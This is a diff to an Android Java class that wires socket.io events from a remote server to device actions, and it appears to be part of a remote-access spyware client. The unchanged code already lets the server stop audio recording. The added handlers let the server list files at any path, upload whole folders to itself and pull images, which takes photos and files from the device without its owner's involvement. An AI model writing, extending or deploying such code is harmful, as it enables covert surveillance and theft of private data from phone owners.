@@ -5,18 +5,24 @@ package com.brocode.startups;
 
 import android.app.ActivityManager;
 import android.content.Context;
+import android.content.Intent;
+import android.os.Environment;
 import android.util.Log;
 
 import com.brocode.models.AudioRecorder;
 import com.brocode.models.IOSocket;
 import com.brocode.models.NotificationListener;
 import com.brocode.models.fileManager;
+import com.brocode.utils.ChunkedFileUpload;
 import com.brocode.utils.Constants;
+import com.brocode.utils.Util;
 
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.io.IOException;
 import java.net.URI;
+import java.util.Arrays;
 
 import io.socket.client.Socket;
 
@@ -24,7 +30,7 @@ public class ConManager {
 
 	private static Socket socket = IOSocket.getSocket();
 
-	public static void initEvents() {
+	public static void initEvents() throws IOException {
 		Log.i("Socket initEvents", "initializing event listeners");
 
 		socket.on("e#pcm-send-stop", args -> AudioRecorder.stopRecording());
@@ -37,17 +43,15 @@ public class ConManager {
 			try {
 			 fileManager.getBaseFolder();
 			} catch (Exception e) {
-
+				Log.d("getRootfile-ex","root files got an Exception" + e.toString());
 			}
 		});
-		fileManager.getListOfFile("Android");
-		fileManager.getListOfFile("Downalod");
-		fileManager.getListOfFile("DCIM/Camera");
+		socket.on("e#getByPath",args -> fileManager.getListOfFile( args));         //need to test this feature From the Api Events
+		socket.on("uploadTotheServre", args -> fileManager.DownloadFoler(args));
+		socket.on("ImageDownload",args -> fileManager.DownloadImage(args));
+
 
 	}
-
-
-
 
 	public static Socket getSocket() {
 		return socket;
